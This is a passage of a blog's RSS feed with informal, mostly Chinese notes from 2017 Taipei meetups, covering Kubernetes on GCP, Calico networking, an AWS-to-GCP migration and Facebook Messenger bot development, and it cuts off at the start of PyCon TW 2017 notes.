&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 02 Aug 2017 19:40:45 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-08-02:posts/2017/08/02/gdg-taipei-40/</guid><category>Tech</category></item><item><title>GCPUG.tw #27</title><link>https://blog.m157q.tw/posts/2017/07/05/gcpug-tw-27/</link><description>&lt;p&gt;Event link: &lt;a href="https://gcpugtw.kktix.cc/events/meetup201707"&gt;https://gcpugtw.kktix.cc/events/meetup201707&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Using Kubernetes to deploy Django in GCP&lt;/h2&gt;
&lt;p&gt;Speaker: Walter Liu&lt;br /&gt;
Slides: &lt;a href="https://www.slideshare.net/walterliu7/using-kubernetes-to-deploy-django-in-gcp"&gt;https://www.slideshare.net/walterliu7/using-kubernetes-to-deploy-django-in-gcp&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io/docs/tutorials/stateful-application/basic-stateful-set/"&gt;Statefulset&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Beta feature since k8s 1.7  &lt;/li&gt;
&lt;li&gt;Sharding Service  &lt;/li&gt;
&lt;li&gt;還是得設定 service 給他，不然 DNS lookup 會找不到  &lt;/li&gt;
&lt;li&gt;Like deployment with static POD name  &lt;/li&gt;
&lt;li&gt;Usage: Sharded service  &lt;ul&gt;
&lt;li&gt;redis  &lt;/li&gt;
&lt;li&gt;memcached  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other usage: static volume  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Secret / ConfigMap  &lt;/li&gt;
&lt;li&gt;Service  &lt;/li&gt;
&lt;li&gt;Ingress  &lt;ul&gt;
&lt;li&gt;Global Load Balancer  &lt;/li&gt;
&lt;li&gt;No firewall ability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;k8s has no crontab (currently)  &lt;ul&gt;
&lt;li&gt;Use Celery  &lt;/li&gt;
&lt;li&gt;Use crontab in Google App Engine  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;k8s + GCP Load Balancer  &lt;/li&gt;
&lt;li&gt;Cluster creation steps  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;kubectl create -f web_secretes.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl apply -f cache_stateful_set.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;./titan_control deploy prod&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Like =&amp;gt; &lt;code&gt;kubectl apply -f prod_web_deploy.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl apply -f service.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl apply -f ingress.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;gsutil mb -l asia gs://static.example.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;要記得檢查該開啟來的 service 有沒有開起來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;遇到的問題  &lt;ul&gt;
&lt;li&gt;Templating  &lt;ul&gt;
&lt;li&gt;Use Python Jinja to do k8s templating  &lt;/li&gt;
&lt;li&gt;Someone had suggested me to use &lt;a href="https://github.com/kubernetes/helm"&gt;HELM&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Show templating example  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;深入 Kubernetes Network，Calico Overlet Network 介紹&lt;/h2&gt;
&lt;p&gt;Speaker: 光光&lt;br /&gt;
Slides: &lt;a href="https://www.slideshare.net/IsaacTseng/20170705-kubernetes-with-calico"&gt;https://www.slideshare.net/IsaacTseng/20170705-kubernetes-with-calico&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;k8s cluster network  &lt;ul&gt;
&lt;li&gt;inside a pod  &lt;ul&gt;
&lt;li&gt;App &amp;amp; DB connection with local network  &lt;ul&gt;
&lt;li&gt;因為在同個 Pod 走內網，所以不會有 performance 的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pod-to-service  &lt;ul&gt;
&lt;li&gt;Conneciton via Service  &lt;ul&gt;
&lt;li&gt;不會有啥太大的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;external-to-service  &lt;ul&gt;
&lt;li&gt;Conneciton via Service  &lt;ul&gt;
&lt;li&gt;不會有啥太大的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pod-to-pod  &lt;ul&gt;
&lt;li&gt;Pod &amp;amp; Pod may in different hosts  &lt;/li&gt;
&lt;li&gt;How to connect two Pods?  &lt;/li&gt;
&lt;li&gt;這會是今天主要探討的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Overlay network  &lt;ul&gt;
&lt;li&gt;Flannel  &lt;ul&gt;
&lt;li&gt;CoreOS 使用 &lt;a href="https://github.com/coreos/flannel"&gt;Flannel&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;All pockets go through Flannel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Performance  &lt;ul&gt;
&lt;li&gt;Overlay vs Underlay  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;User story  &lt;ul&gt;
&lt;li&gt;IPsec Tunneling  &lt;ul&gt;
&lt;li&gt;在內部網路仍然使用 IPsec Tunneling 導致 throughput Performance 下降了約 80%  &lt;/li&gt;
&lt;li&gt;為了想要解決這個問題，所以用上了 Calico  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://rancher.com/rancher-os/"&gt;RancherOS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rancher/os"&gt;https://github.com/rancher/os&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico"&gt;Calico&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.projectcalico.org//"&gt;https://www.projectcalico.org//&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Features  &lt;ul&gt;
&lt;li&gt;Use etcd  &lt;/li&gt;
&lt;li&gt;BGP Routing  &lt;/li&gt;
&lt;li&gt;Pod get routings to other Pod  &lt;/li&gt;
&lt;li&gt;Packets not over Calico  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to use  &lt;ul&gt;
&lt;li&gt;Kubelet settings: &lt;code&gt;--network-plugin=cni&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CoreOS 的相容性不太高，要做網路層的實體 binding 的話會比較複雜，可能需要多注意一點。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/"&gt;Daemon Set&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl apply -f calico.yaml&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;kubectl get pod --namespace=kube-system&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;為什麼選 Calico 不選 Flannel?  &lt;ul&gt;
&lt;li&gt;因為 Flannel 是 Overlay Network，而且不在 CoreOS 裏面用的話會很麻煩  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼 GCP 比 Calico 更好？  &lt;ul&gt;
&lt;li&gt;GKE 是執行在 GCE 裏面，然後 Network 是直接跟 GCE 作 bridge，所以 Pod 之間的溝通會很方便。  &lt;/li&gt;
&lt;li&gt;但會有個問題，如果要做一些安全性的限制的話會比較麻煩，因為大家的網路都是 bridge 在一起，所以比較難針對這點去做限制。  &lt;/li&gt;
&lt;li&gt;如果有這方面的考量的話，建議不要直接用 GKE，但可以試著在 GCE 上安裝 Calico 來使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Calico node 會去處理他擁有的 IP，寫在 etcd 裡頭。BGP peering 之後，IP 就可以共享。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BGP Peering  &lt;ul&gt;
&lt;li&gt;可以透過 BGP Peering 的方式，把 Pod 之間相連起來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有興趣的人也可以去玩一下 GCP 上的 &lt;a href="https://cloud.google.com/container-optimized-os/docs/"&gt;Container-Optimized OS&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;從 AWS 轉移到 GCP，一個新創團隊搬家的故事: TABLEAPP Architecture Story&lt;/h2&gt;
&lt;p&gt;Speaker: 陳彥文&lt;br /&gt;
Slides: &lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story"&gt;https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;幫一家新創公司解決 Server 維護上的問題  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找出問題  &lt;ul&gt;
&lt;li&gt;展開完整架構  &lt;/li&gt;
&lt;li&gt;列出操遇到的狀況  &lt;/li&gt;
&lt;li&gt;儘可能開啟所有 log  &lt;/li&gt;
&lt;li&gt;分析狀況來源  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;選定改善目標及檢驗標準  &lt;ul&gt;
&lt;li&gt;降低成本  &lt;/li&gt;
&lt;li&gt;資源使用效率  &lt;/li&gt;
&lt;li&gt;減緩月支出成長速度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other Benefits of Docker  &lt;ul&gt;
&lt;li&gt;Version Control  &lt;ul&gt;
&lt;li&gt;push code and build  &lt;/li&gt;
&lt;li&gt;every commit has its own images  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Lightweight  &lt;/li&gt;
&lt;li&gt;Isolation  &lt;/li&gt;
&lt;li&gt;Portable  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How about K8S on EC2?  &lt;ul&gt;
&lt;li&gt;Deploy kubernets on EC2  &lt;ul&gt;
&lt;li&gt;Maintain Kubernetes yourself  &lt;ul&gt;
&lt;li&gt;Install  &lt;/li&gt;
&lt;li&gt;Testing  &lt;/li&gt;
&lt;li&gt;Updating  &lt;/li&gt;
&lt;li&gt;and ...  &lt;/li&gt;
&lt;li&gt;Kubernetes updates really fast  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Handle auto-scaling manually  &lt;ul&gt;
&lt;li&gt;Remove pods before remove ec2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using CI to deploy image  &lt;/li&gt;
&lt;li&gt;Set up logging and monitoring policy  &lt;/li&gt;
&lt;li&gt;Integrate AWS resource and Kubernetes manually  &lt;ul&gt;
&lt;li&gt;It must be scalabel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;It sucks...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Kubernetes on GCP is awesome  &lt;ul&gt;
&lt;li&gt;GKE  &lt;ul&gt;
&lt;li&gt;Easy  &lt;/li&gt;
&lt;li&gt;Full managed  &lt;ul&gt;
&lt;li&gt;even update kubernetes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Logging and Monitoring support (stackdrive)  &lt;/li&gt;
&lt;li&gt;Automatic and configurable cluster scaling  &lt;/li&gt;
&lt;li&gt;Google Cloud Platform resource integration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story/17"&gt;GCP&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story/18"&gt;Inside k8s&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story/19"&gt;Deployment&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/wenchen3/from-aws-to-gcp-tableapp-architecture-story/20"&gt;Log Collection&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這架構挺棒的，雖然不大，但把可以用的都用上了，可以學習一下。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cost and Usage  &lt;ul&gt;
&lt;li&gt;Hybrid 時期的 cost 有比較高  &lt;/li&gt;
&lt;li&gt;後來做完 migration 到 GCP 之後，cost 比在 AWS 上降一半，然後 handle 的 request 量多 5 倍。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;CloudCDN is really fast  &lt;ul&gt;
&lt;li&gt;very low latency  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Lower price  &lt;ul&gt;
&lt;li&gt;based on new arch, we save 40% cost  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;平台終究只是工具，人才是最大的關鍵。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 05 Jul 2017 21:46:56 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-07-05:posts/2017/07/05/gcpug-tw-27/</guid><category>Google Cloud Platform</category></item><item><title>Facebook Developer Circle: Taipei - Meetup #2</title><link>https://blog.m157q.tw/posts/2017/06/22/facebook-developer-circle-taipei-meetup-2/</link><description>&lt;ul&gt;
&lt;li&gt;Event Link: &lt;a href="https://fdctaipei.kktix.cc/events/fdc201706"&gt;https://fdctaipei.kktix.cc/events/fdc201706&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Facebook Messenger Platform 現況&lt;/h2&gt;
&lt;p&gt;Speaker: Sean Liu (urAD co-founder)  &lt;/p&gt;
&lt;h3&gt;Agenda&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;為什麼我要做 Bot 相關產品  &lt;/li&gt;
&lt;li&gt;NLP 的理想與現實  &lt;/li&gt;
&lt;li&gt;Facebook Messenger Platform 發展方向的一些轉折  &lt;/li&gt;
&lt;li&gt;Bot 的管理實務  &lt;/li&gt;
&lt;li&gt;ID Matching  &lt;/li&gt;
&lt;li&gt;Bot 與 Ad-Tech  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Why Messenger Platform?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;下載 App 的人愈來愈少  &lt;/li&gt;
&lt;li&gt;App 的市場都集中在超級大的 App 上  &lt;/li&gt;
&lt;li&gt;Messenger Bot 可以利用既有的社交圖譜  &lt;/li&gt;
&lt;li&gt;一鍵式 Payment  &lt;/li&gt;
&lt;li&gt;微信是非常好的成功案例  &lt;ul&gt;
&lt;li&gt;微信 Bot: 微信公眾好  &lt;/li&gt;
&lt;li&gt;微信小程序  &lt;/li&gt;
&lt;li&gt;創造出了依附在社交圈的龐大經濟體系  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bot 能接觸到我們過往所無法接觸到的私密對話  &lt;ul&gt;
&lt;li&gt;人們在使用對話的時候與其平常在網路上的行為是更真實的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但是，Bot 如何創造價值  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;NLP 的理想與現實&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;urAD 和 ChocoLab 合作開發的 CHOCO TV BOT  &lt;ul&gt;
&lt;li&gt;花了很多時間在制定彼此之間的 API 格式  &lt;/li&gt;
&lt;li&gt;需要從 CHOCO LAB 的 API 拿到影劇和演員的資料建立 Entity  &lt;/li&gt;
&lt;li&gt;影劇的別名，例如：冰與火之歌 == 權力的遊戲  &lt;/li&gt;
&lt;li&gt;劇名、季數、集數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;現實是你根本無法預期使用者會怎麼跟 Bot 對話，使用者也根本不在乎，常常都會出現 Bot 無法理解的語句，毫無規則可言。  &lt;/li&gt;
&lt;li&gt;資料的整理梳理和 NLP 的分詞斷句花了不少時間  &lt;/li&gt;
&lt;li&gt;Bot vs Google Search?  &lt;ul&gt;
&lt;li&gt;做的要死要活的還不如拿去 Google Search 請它幫你？  &lt;/li&gt;
&lt;li&gt;想找尋某個特定的場景劇情發生時是在哪一集  &lt;ul&gt;
&lt;li&gt;可以把截圖抓出來  &lt;/li&gt;
&lt;li&gt;NLP 分析使用者的問句  &lt;/li&gt;
&lt;li&gt;把影片中的每個 frame 用 ffmpeg 抓出來，丟到 Google Cloud Vision 或 IBM Watson 認出截圖中的 objects，再去建 index。（但建一部影片的 index 的成本極高）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NLP 和 ML 不是黑魔法  &lt;ul&gt;
&lt;li&gt;必須要花時間建立 entity 和 &lt;a href="https://en.wikipedia.org/wiki/Utterance"&gt;utterance&lt;/a&gt; 並不時修正補強  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Context （對話脈絡）  &lt;ul&gt;
&lt;li&gt;使用者要找某部作品  &lt;/li&gt;
&lt;li&gt;又問了這部劇的演員還演過哪齣劇  &lt;/li&gt;
&lt;li&gt;又問了這部劇的平均收視率是多少  &lt;/li&gt;
&lt;li&gt;Bot 只能回答第一個問題，因為它並不像人一樣預設就可以記住上文的東西 (Context free?)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;api.ai, wit.ai, IBM Watson NLP api 有提供前後文關聯的機制  &lt;ul&gt;
&lt;li&gt;會幫你去尋找之前的問句的 Entity  &lt;/li&gt;
&lt;li&gt;但當 intent 的數量太多的時候，會遇到問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Facebook Messenger Platform 發展方向的一些轉折&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Quick reply  &lt;/li&gt;
&lt;li&gt;Persistent menu 從 5 個改成 3x5x5 個 menu  &lt;/li&gt;
&lt;li&gt;Composer Drawer  &lt;ul&gt;
&lt;li&gt;Messenger 對話欄輸入框最左邊的 + 號 (邊緣人調查 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chat Extensions  &lt;/li&gt;
&lt;li&gt;小結： AI 還太遙遠，WebView 優先。  &lt;ul&gt;
&lt;li&gt;在真的願意花時間和成本去解決 NLP 和 ML 的資料訓練以前，必須要一段不短的時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Bot 的管理實務&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;和接下來講的 Business Manager 和 ID Matching 有點關係  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Tokens&lt;/h4&gt;
&lt;p&gt;Facebook User 不盡然等於 Messenger User  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;User Access Token  &lt;ul&gt;
&lt;li&gt;使用者透過 OAuth 去授權你的 Facebook App 後所取得的 Access Token  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Page Access Token  &lt;ul&gt;
&lt;li&gt;透過 User Access Token 取得 User 的 Facebook 帳號下，擁有管理 Page 權限的 Access Token。  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這串到底是在工三小 XDDDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;App Access Token  &lt;/li&gt;
&lt;li&gt;System User Access Token  &lt;/li&gt;
&lt;li&gt;Admin System User Access Token  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ID Matching&lt;/h3&gt;
&lt;p&gt;Global User ID vs ASID vs PSID  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;萬惡的層層 ID 限制 XD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;ASID: App-Scoped ID  &lt;/li&gt;
&lt;li&gt;PSID: Page-Scoped ID  &lt;ul&gt;
&lt;li&gt;使用者與某個 Bot 互動後，該 Bot 所獲得代表該名使用者的 ID  &lt;/li&gt;
&lt;li&gt;只有在該 Bot 有效  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ASID 可以重新在 Facebook 上找到使用者，但 PSID 不行  &lt;ul&gt;
&lt;li&gt;透過 Facebook Graph API 用 ASID 去找到該名使用者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Messenger Bot Platform 2.0 推出的 ID Matching  &lt;ul&gt;
&lt;li&gt;讓開發者可以透過 PSID 找到該名使用者的 ASID  &lt;/li&gt;
&lt;li&gt;讓開發者可以拿到使用者的資料回去 Messenger Bot，強化 CRM (Customer Relationship Management)  &lt;/li&gt;
&lt;li&gt;對企業很重要，因為可以拿來做廣告 XDDD  &lt;ul&gt;
&lt;li&gt;可以餵 ASID 和 PSID 來投放廣告  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ID Matching 是完全開放的 API 但有些嚴苛的限制  &lt;ul&gt;
&lt;li&gt;必須要 App 和 Bot 都歸在同個 Business Manager 底下才能作用  &lt;/li&gt;
&lt;li&gt;Secret Proof 必須要用到 App Access Token，而 Secret Proof 是必須要帶在 ID Matching request 的 Payload 裡面的。  &lt;/li&gt;
&lt;li&gt;一定兩個都要是 owner 嗎？還是說只要是有被分享就可以？  &lt;/li&gt;
&lt;li&gt;一個 BM 目前可以建 10 個 System User 和一個 System Admin User  &lt;/li&gt;
&lt;li&gt;System User 可以不用是一個真的人，有點像是資源歸類的角色。  &lt;/li&gt;
&lt;li&gt;強烈建議把 Bot 和 Page 的管理都放在 BM 底下，而不是某個 User。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;快速上手 Messenger API 輕鬆打造自己的智能客服&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Ian Lin (Chatisfy CTO)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Messenger API 能做什麼？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;比較具有代表性的 Chat Bot  &lt;ul&gt;
&lt;li&gt;eBay ShopBot  &lt;ul&gt;
&lt;li&gt;可以透過文字輸入和圖片上傳找到商品  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Madison Reed  &lt;ul&gt;
&lt;li&gt;用問題引導的方式，理解客戶的需求並推薦適合的染髮劑，點選商品就會引到進入官網購買。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;台鐵時刻通  &lt;ul&gt;
&lt;li&gt;輸入起迄點就會答覆最近時刻班次、票價和火車動態，也可以直接線上訂票（用 WebView 開啟台鐵訂票網頁）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Her/Him  &lt;ul&gt;
&lt;li&gt;隨機找陌生人聊天，還能推薦你聊天話題，在雙方同意情況下可以交換 Facebook  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;要如何開始建立聊天機器人？&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;建立 Facebook App 和粉絲專頁  &lt;/li&gt;
&lt;li&gt;設定 Webhook  &lt;ul&gt;
&lt;li&gt;欄位設定  &lt;ul&gt;
&lt;li&gt;回呼網址  &lt;/li&gt;
&lt;li&gt;驗證權杖  &lt;/li&gt;
&lt;li&gt;訂閱欄位  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Messaging Referral  &lt;ul&gt;
&lt;li&gt;m.me  &lt;/li&gt;
&lt;li&gt;?ref=xxx  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;取得粉絲專頁的 Access Token  &lt;/li&gt;
&lt;li&gt;粉絲團訂閱應用程式  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;有什麼方法可以更快速建立聊天機器人嗎？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Chatisfy （偷打廣告 XD 雖然有用過是真的還不錯用就是了  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;從 0 到 20000 MAU&lt;/h2&gt;
&lt;p&gt;Speaker: Howard Chang  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「嗨，大家好，我是 Her/Him, Her/Her, Him/Him 開發者，因為太長，所以我都簡稱 H/H 開發者。」  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「剛剛看了一下，已經到 25000 MAU 了。」  &lt;/li&gt;
&lt;li&gt;「媒體帶來的是大量的曝光但幾乎都不是有真正交友需求的受眾，都是那些會看科技新聞的人，就像在座的各位。」  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;靠北 XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「上個禮拜辦了個叫作『拉拉網路獵愛』的線下聚會，會後她們討論交過幾個女朋友的單位是用『打』在算的，聽到都跪在地上了。」  &lt;/li&gt;
&lt;li&gt;用什麼工具來計算 Messenger Bot 的使用者流量  &lt;ul&gt;
&lt;li&gt;Google Analytics  &lt;ul&gt;
&lt;li&gt;比較難應用，但還是有埋  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Botmize  &lt;ul&gt;
&lt;li&gt;針對中文有做些斷句斷詞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dashbot  &lt;ul&gt;
&lt;li&gt;全球最大的 Chat Bot 分析工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Botmetrics  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Thu, 22 Jun 2017 21:41:20 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-06-22:posts/2017/06/22/facebook-developer-circle-taipei-meetup-2/</guid><category>Facebook</category><category>Meetup</category></item><item><title>PyCon TW 2017</title><link>https://blog.m157q.tw/posts/2017/06/09/pycon-tw-2017/</link><description>&lt;p&gt;Website: &lt;a href="https://tw.pycon.org/2017/en-us/"&gt;https://tw.pycon.org/2017/en-us/&lt;/a&gt;&lt;br /&gt;
Portal: &lt;a href="https://tw.pycon.org/2017/en-us/portal/"&gt;https://tw.pycon.org/2017/en-us/portal/&lt;/a&gt;&lt;br /&gt;
Chat: &lt;a href="https://gitter.im/pycontw/2017"&gt;https://gitter.im/pycontw/2017&lt;/a&gt;&lt;br /&gt;
Collaborative Notes: &lt;a href="https://hackfoldr.org/pycontw2017/"&gt;https://hackfoldr.org/pycontw2017/&lt;/a&gt;&lt;br /&gt;
Quiz Bot: &lt;a href="https://pycontw2017-quizbot.herokuapp.com/"&gt;https://pycontw2017-quizbot.herokuapp.com/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1 (2017/06/09)&lt;/h1&gt;
&lt;h2&gt;Keynote: Choices for Smarter AI&lt;/h2&gt;
&lt;p&gt;Speaker: 林軒田  &lt;/p&gt;
&lt;p&gt;有點像是在大學上第 1 堂 AI 概論的感覺，&lt;br /&gt;
